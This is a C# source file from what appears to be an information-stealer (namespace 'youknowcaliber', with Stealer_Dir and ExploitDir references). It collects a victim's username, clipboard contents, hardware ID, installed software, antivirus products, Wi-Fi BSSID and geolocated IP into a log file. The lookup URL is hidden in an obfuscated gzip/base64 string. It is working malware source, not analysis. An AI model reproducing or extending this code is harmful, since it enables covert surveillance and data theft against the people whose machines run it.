﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Ionic.Zlib;
using Microsoft.Win32;

namespace youknowcaliber
{
	internal class SystemInfo
	{
		public static void GetSystem()
		{
			string exploitDir = Help.ExploitDir;
			string contents = string.Concat(new object[]
			{
				" ==================================================\n Operating system : ",
				SystemInfo.GetSystemVersion(),
				"\n PC user : ",
				SystemInfo.compname,
				"/",
				SystemInfo.username,
				"\n ClipBoard : ",
				Buffer.GetBuffer(),
				"\n Launch : ",
				Help.ExploitName,
				"\n ==================================================\n Screen resolution : ",
				SystemInfo.ScreenMetrics(),
				"\n Current time : ",
				DateTime.Now,
				"\n HWID : ",
				SystemInfo.GetProcessorID(),
				"\n ==================================================\n CPU : ",
				SystemInfo.GetCPUName(),
				"\n RAM : ",
				SystemInfo.GetRAM(),
				"\n GPU : ",
				SystemInfo.GetGpuName(),
				"\n ==================================================\n IP Geolocation : ",
				SystemInfo.IP(),
				" ",
				SystemInfo.Country(),
				"\n Log Date : ",
				Help.date,
				"\n BSSID : ",
				BSSID.GetBSSID(),
				"\n =================================================="
			});
			File.WriteAllText(exploitDir + "\\Information.txt", contents);
		}

		public static string GetSystemVersion()
		{
			return SystemInfo.GetWindowsVersionName() + " " + SystemInfo.GetBitVersion();
		}

		public static string GetWindowsVersionName()
		{
			string text = "Unknown System";
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = Convert.ToString(managementObject["Name"]);
					}
					text = text.Split(new char[]
					{
						'|'
					})[0];
					int length = text.Split(new char[]
					{
						' '
					})[0].Length;
					text = text.Substring(length).TrimStart(Array.Empty<char>()).TrimEnd(Array.Empty<char>());
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return text;
		}

		private static string GetBitVersion()
		{
			try
			{
				bool flag = Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86");
				if (flag)
				{
					return "(32 Bit)";
				}
				return "(64 Bit)";
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return "(Unknown)";
		}

		public static string CountryCOde()
		{
			string result;
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				string text = "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
				string text2 = text;
				result = text2;
			}
			catch
			{
				string text3 = "ERR";
				result = text3;
			}
			return result;
		}

		public static string GetAntivirus()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					bool flag = list.Count == 0;
					if (flag)
					{
						return "Not installed";
					}
					return string.Join(", ", list.ToArray()) + ".";
				}
			}
			catch
			{
			}
			return "N/A";
		}

		public static string Country()
		{
			XmlDocument xmlDocument = new XmlDocument();
			return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
		}

		public static string IP()
		{
			string result;
			try
			{
				string text = new WebClient().DownloadString(SystemInfo.Get("H4sIAAAAAAAEAMsoKSkottLXTyzI1MssyEyr1MsvStcHAPAN4yoWAAAA"));
				result = text;
			}
			catch
			{
				string text2 = "Connection error";
				result = text2;
			}
			return result;
		}

		public static void GetProg(string Echelon_Dir)
		{
			using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\InstalledSoftware.txt", false, Encoding.Default))
			{
				try
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
					string[] subKeyNames = registryKey.GetSubKeyNames();
					for (int i = 0; i < subKeyNames.Length; i++)
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
						string text = registryKey2.GetValue("DisplayName") as string;
						bool flag = text == null;
						if (!flag)
						{
							streamWriter.WriteLine(text);
						}
					}
				}
				catch
				{
				}
			}
		}

		public static string ScreenMetrics()
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			int width = bounds.Width;
			int height = bounds.Height;
			return width + "x" + height;
		}

		public static string GetCPUName()
		{
			string result;
			try
			{
				string text = string.Empty;
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = managementObject["Name"].ToString();
				}
				result = text;
			}
			catch (Exception arg)
			{
				Console.WriteLine(arg + "СистемИнфа");
				result = "Error";
			}
			return result;
		}

		public static string GetRAM()
		{
			string result;
			try
			{
				int num = 0;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							ManagementObject managementObject = (ManagementObject)enumerator.Current;
							double num2 = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
							num = (int)(num2 / 1048576.0) - 1;
						}
					}
				}
				result = num.ToString() + "MB";
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = "Error";
			}
			return result;
		}

		public static string GetProcessorID()
		{
			string result = string.Empty;
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				result = (string)managementObject["ProcessorId"];
			}
			return result;
		}

		public static string Get(string str)
		{
			byte[] array = Convert.FromBase64String(str);
			string result = string.Empty;
			bool flag = array != null && array.Length != 0;
			if (flag)
			{
				using (MemoryStream memoryStream = new MemoryStream(array))
				{
					using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
					{
						using (StreamReader streamReader = new StreamReader(gzipStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		public static string GetGpuName()
		{
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						return managementObject["Name"].ToString();
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return "Unknown";
		}

		public static string Stealer_Dir { get; set; }

		public static string culture = CultureInfo.CurrentCulture.ToString();

		public static string username = Environment.UserName;

		public static string compname = Environment.MachineName;
	}
}
